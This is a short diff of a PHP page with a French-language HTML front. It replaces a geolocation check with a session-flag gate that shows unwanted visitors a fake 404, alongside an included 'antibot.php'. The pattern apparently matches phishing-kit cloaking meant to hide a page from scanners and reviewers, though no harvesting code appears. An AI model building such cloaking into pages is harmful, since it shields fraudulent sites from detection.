@@ -1,7 +1,12 @@
 <?php
 session_start();
 require_once __DIR__ . '/antibot.php';
-checkGeolocation();
+
+// Validate MASTER session
+if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
+    header("HTTP/1.0 404 Not Found");
+    exit;
+}
 ?>
 <!DOCTYPE html>
 <html lang="fr">
